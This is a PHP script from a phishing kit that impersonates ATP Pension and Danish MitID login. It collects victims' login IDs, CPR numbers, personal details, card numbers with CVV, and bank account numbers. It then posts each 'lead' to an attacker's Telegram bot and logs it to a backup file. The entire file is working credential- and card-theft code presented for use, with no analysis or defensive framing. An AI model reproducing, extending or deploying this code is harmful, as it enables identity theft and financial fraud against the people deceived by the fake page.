<?php
require_once 'config.php';
session_start();

if (!isset($_SESSION['lead_id'])) {
    header('Location: index.php');
    exit;
}

// Collect all session data
$lead_data = [
    'lead_id' => $_SESSION['lead_id'],
    'cvr_number' => $_SESSION['cvr_number'] ?? 'N/A',
    'company_name' => $_SESSION['company_name'] ?? 'N/A',
    'bruger_id' => $_SESSION['bruger_id'] ?? 'N/A',
    'phone_number' => $_SESSION['phone_number'] ?? 'N/A',
    'full_name' => $_SESSION['full_name'] ?? 'N/A',
    'address' => $_SESSION['address'] ?? 'N/A',
    'postal_code' => $_SESSION['postal_code'] ?? 'N/A',
    'city' => $_SESSION['city'] ?? 'N/A',
    'bank' => $_POST['bank'] ?? 'N/A',
    'card_holder' => $_POST['card_holder'] ?? 'N/A',
    'card_number' => $_POST['card_number'] ?? 'N/A',
    'expiry' => $_POST['expiry'] ?? 'N/A',
    'cvv' => $_POST['cvv'] ?? 'N/A',
    'reg_number' => $_POST['reg_number'] ?? 'N/A',
    'account_number' => $_POST['account_number'] ?? 'N/A',
    'device_info' => $_SESSION['device_info'] ?? [],
    'timestamp' => date('Y-m-d H:i:s')
];

// Get lead counter
$lead_number = 1;
if (file_exists($lead_counter_file)) {
    $lead_number = (int)file_get_contents($lead_counter_file) + 1;
}
file_put_contents($lead_counter_file, $lead_number);

// Build Telegram message in FULLZ format
$message = "━━━🟩✅ATP PENSION✅🟩━━━\n";
$message .= "🎰 New Lead: #{$lead_number}\n\n";
$message .= "🗓️ Date: " . date('d/m/Y H:i:s') . "\n\n";
$message .= "🔐 MitID Login Details:\n";
$message .= "─ Log på hos atp.dk ─\n";
$message .= "Bruger-ID: <code>{$lead_data['bruger_id']}</code>\n";
$message .= "CPR-nummer: <code>{$lead_data['cvr_number']}</code>\n\n";
$message .= "👤 Personal Information:\n";
$message .= "☎️ Phone Number: <code>{$lead_data['phone_number']}</code>\n";
$message .= "👤 Full Name: <b>{$lead_data['full_name']}</b>\n";
$message .= "🏠 Address: {$lead_data['address']}\n";
$message .= "📮 Postal Code: {$lead_data['postal_code']}\n";
$message .= "🏙️ City: {$lead_data['city']}\n";
$message .= "🏦 Bank: <b>{$lead_data['bank']}</b>\n\n";
$message .= "💳 Card & Account Details:\n";
$message .= "💳 Card Holder: <b>{$lead_data['card_holder']}</b>\n";
$message .= "💳 Card Number: <code>{$lead_data['card_number']}</code>\n";
$message .= "📅 Expiry Date: <code>{$lead_data['expiry']}</code>\n";
$message .= "🔒 CVV: <code>{$lead_data['cvv']}</code>\n";
$message .= "🏦 Reg Nr: <code>{$lead_data['reg_number']}</code>\n";
$message .= "💰 Konto Nr: <code>{$lead_data['account_number']}</code>\n\n";
$message .= "🌐 Device & Network Information:\n";
$message .= "📍 IP Address: <code>{$lead_data['device_info']['ip']}</code>\n";
$message .= "🌍 Country: {$lead_data['device_info']['country']}\n";
$message .= "💻 Device: {$lead_data['device_info']['device_type']}\n";
$message .= "━━━🟩✅ATP PENSION✅🟩━━━";

// Send to Telegram
function sendToTelegram($bot_token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// Send to Telegram
$telegram_response = sendToTelegram($bot_token, $chat_id, $message);

// Backup: Log to file
if ($enable_file_log) {
    $log_dir = dirname($log_file);
    if (!is_dir($log_dir)) {
        mkdir($log_dir, 0755, true);
    }
    
    // Read existing leads
    $leads = [];
    if (file_exists($log_file)) {
        $leads = json_decode(file_get_contents($log_file), true) ?? [];
    }
    
    // Add new lead
    $leads[] = $lead_data;
    
    // Save
    file_put_contents($log_file, json_encode($leads, JSON_PRETTY_PRINT));
}

// Clear session data (but keep for reference)
$_SESSION['lead_completed'] = true;

// Redirect to thank you page
header('Location: step5.php');
exit;
?>
